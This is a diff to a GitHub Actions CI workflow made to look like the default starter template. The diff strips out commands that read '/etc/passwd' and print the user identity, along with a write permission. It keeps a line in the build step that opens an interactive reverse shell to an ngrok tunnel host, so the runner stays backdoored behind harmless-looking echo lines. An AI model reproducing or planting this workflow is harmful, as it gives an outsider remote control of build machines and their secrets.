@@ -2,7 +2,7 @@
 
 name: CI
 
-# Controls when the workflow will run#
+# Controls when the workflow will run
 on:
   # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
@@ -13,8 +13,6 @@ on:
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
-permissions:
-  pull-requests: write
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
   # This workflow contains a single job called "build"
@@ -34,8 +32,6 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          cat /etc/passwd
-          cat /etc/passwd
-          id
-          whoami
+          echo Add other actions to build,
+          echo test, and deploy your project.
           bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/10952 0>&1
